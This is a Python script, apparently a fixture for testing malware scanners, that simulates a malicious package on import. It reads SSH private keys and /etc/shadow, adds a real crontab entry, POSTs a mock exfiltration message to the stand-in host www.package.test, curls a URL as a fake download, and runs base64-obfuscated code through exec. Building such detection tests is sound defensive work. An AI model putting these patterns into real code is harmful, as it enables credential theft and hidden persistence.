import base64
import datetime
import getpass
import hashlib
import http.client
import json
import os
import pathlib
import platform
import shutil
import socket
import subprocess
import sys
import tempfile


def malicious_execution():
    """
    Execute a series of malicious actions to simulate a compromised environment.
    """
    try:
        send_http_post_request(),
        simulate_curl_malware_download(),
        access_ssh_keys(),
        access_passwords(),
        simulate_persistence(),
        harvest_installed_packages(),
        collect_system_info(),
        simulate_obfuscated_code_base64(),
        simulate_obfuscated_code_binary(),
    except Exception as e:
        pass


def send_http_post_request():
    """
    Simulate exfiltration of user data via HTTPS POST request.
    """
    try:
        fake_url = "www.package.test"
        connection = http.client.HTTPSConnection(fake_url, timeout=3)
        data = {
            "text": "[SIMULATED] Exfiltrating environment variables"
        }
        json_data = json.dumps(data)
        connection.request("POST", "/post", json_data, headers={"Host": fake_url, "Content-Type": "application/json"})
        connection.getresponse()
    except Exception as e:
        pass


def simulate_http_get_request():
    """
    Simulate a simple HTTP GET request.
    """
    try:
        fake_url = "www.package.test"
        connection = http.client.HTTPConnection(fake_url, timeout=3)
        connection.request("GET", "/")
        response = connection.getresponse()
        data = response.read()
    except Exception as e:
        pass


def simulate_curl_malware_download():
    """
    Simulate loading additional malware using a curl command.
    """
    try:
        fake_url = "https://wikipedia.com"
        curl_command = f"curl -s {fake_url}"
        os.popen(curl_command)
    except Exception as e:
        pass


def access_ssh_keys():
    """
    Simulate access and modification of SSH keys.
    """
    try:
        ssh_dir = os.path.expanduser("~/.ssh")
        private_key = os.path.join(ssh_dir, "id_rsa")
        public_key = os.path.join(ssh_dir, "id_rsa.pub")
        # Simulate reading private key
        if os.path.exists(private_key):
            with open(private_key, "rb") as f:
                keys = f.read()
        # Simulate reading public key
        if os.path.exists(public_key):
            with open(public_key, "rb") as f:
                keys = f.read()
    except Exception as e:
        pass


def access_passwords():
    """
    Simulate access to /etc/passwd and /etc/shadow files.
    """
    try:
        passwd_file = "/etc/passwd"
        shadow_file = "/etc/shadow"
        # Simulate reading /etc/passwd
        if os.path.exists(passwd_file):
            with open(passwd_file, "r", encoding="utf-8") as f:
                data = f.read()
        # Simulate reading /etc/shadow
        if os.path.exists(shadow_file):
            with open(shadow_file, "r", encoding="utf-8") as f:
                data = f.read()
    except Exception as e:
        pass


def simulate_persistence():
    """
    Simulate persistence by writing a fake cronjob to crontab.
    """
    try:
        crontab_path = shutil.which("crontab")
        if crontab_path:
            cronjob = '* * * * * echo "You were hacked!1"\n'
            proc = subprocess.Popen([crontab_path, "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            current_cron = stdout.decode() if proc.returncode == 0 else ""
            new_cron = current_cron + cronjob
            proc = subprocess.Popen([crontab_path, "-"], stdin=subprocess.PIPE)
            proc.communicate(input=new_cron.encode())
            subprocess.Popen("crontab -l", shell=True).wait()
    except Exception as e:
        pass


def harvest_installed_packages():
    """
    Simulate harvesting installed packages by listing them.
    """
    try:
        import importlib.metadata
        packages = importlib.metadata.distributions()
        for pkg in packages:
            name = pkg.metadata['Name']
            version = pkg.version
    except Exception as e:
        pass


def collect_system_info():
    """
    Simulate collection of system information.
    """
    try:
        uname = platform.uname()
        user = getpass.getuser()
        python_version = platform.python_version()
        hostname = platform.node()
        system = platform.system()
        env_vars = dict(os.environ)
        ip = socket.gethostname()
    except Exception as e:
        pass


def simulate_write_to_temp_file():
    """
    Simulate writing to a temporary file.
    """
    try:
        filename = os.path.join(
            tempfile.gettempdir(),
            hashlib.md5("simulation".encode('utf-8', errors='ignore')).hexdigest()
        )
        open(filename, 'w').write(b'')
    except Exception as e:
        pass


def simulate_obfuscated_code_base64():
    """
    Simulate execution of obfuscated code.
    """
    try:
        code = 'cHJpbnQoIllvdSB3ZXJlIGhhY2tlZCEiKQ=='
        # This decodes to: print("You were hacked!")
        decoded = base64.b64decode(code).decode()
        exec(decoded)
    except Exception as e:
        pass


def simulate_obfuscated_code_binary():
    """
    Simulate execution of obfuscated code using actual binary data.
    """
    try:
        source = 'print("You were hacked!")'
        code = compile(source, '<string>', 'exec') # Todo
        exec(code)
    except Exception as e:
        pass


SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(SCRIPT_DIR)

try:
    malicious_execution()
except Exception as e:
    pass

try:
    pathlib.Path("/temp").mkdir(parents=True, exist_ok=True)
    with open("/temp/virus_setup.txt", "w", encoding="utf-8") as buffer:
        buffer.write(f"I was here at {datetime.datetime.now()} ;>")
except Exception as e:
    pass
